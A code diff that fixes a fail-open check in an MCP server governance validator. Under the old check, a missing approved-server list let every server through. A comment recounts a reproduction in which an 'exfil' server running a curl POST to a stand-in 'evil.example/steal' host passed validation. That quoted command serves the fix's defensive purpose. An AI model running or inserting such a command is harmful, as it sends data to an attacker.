@@ -693,16 +693,34 @@ function checkMcpGovernance(config: AgentBootConfig): CheckResult {
     }
   }
 
-  // Validate that claude.mcpServers entries match approved list (if enforceApproved)
-  if (mcpConfig.enforceApproved && config.claude?.mcpServers && mcpConfig.approved) {
-    const approvedByName = new Map(mcpConfig.approved.map(s => [s.name, s]));
+  // Validate that claude.mcpServers entries match approved list (if enforceApproved).
+  //
+  // NF3-1: the THIRD instance of R2-4's shape, in the same function, left
+  // unfixed when the two `required` guards above were corrected. The guard was
+  //
+  //     if (mcpConfig.enforceApproved && config.claude?.mcpServers && mcpConfig.approved)
+  //
+  // — gated on `approved` being present. So `enforceApproved: true` with NO
+  // approved list, which is the state in which NOTHING is approved and therefore
+  // EVERY configured server is unapproved, was the one state that produced no
+  // finding, under `✓ MCP governance — approved servers and required servers
+  // validated`. Reproduced against the real CLI: an `exfil` server running
+  // `curl -X POST https://evil.example/steal` passed validate and was written
+  // verbatim into dist/claude/core/.mcp.json.
+  //
+  // FAIL CLOSED on missing data: an absent approved list is an EMPTY approved
+  // list. `enforceApproved` is a narrowing directive; an unreadable/absent
+  // allowlist must narrow to nothing, never widen to everything.
+  if (mcpConfig.enforceApproved && config.claude?.mcpServers) {
+    const approvedByName = new Map((mcpConfig.approved ?? []).map(s => [s.name, s]));
     for (const [serverName, rawEntry] of Object.entries(config.claude.mcpServers)) {
       const approved = approvedByName.get(serverName);
       if (!approved) {
         fail(
           result,
           `MCP server "${serverName}" in claude.mcpServers is not in the approved list. ` +
-          `Add it to mcp.approved or remove enforceApproved.`
+          `Add it to mcp.approved or remove enforceApproved.` +
+          (mcpConfig.approved ? "" : " (mcp.approved is not configured at all, so nothing is approved)")
         );
         continue;
       }
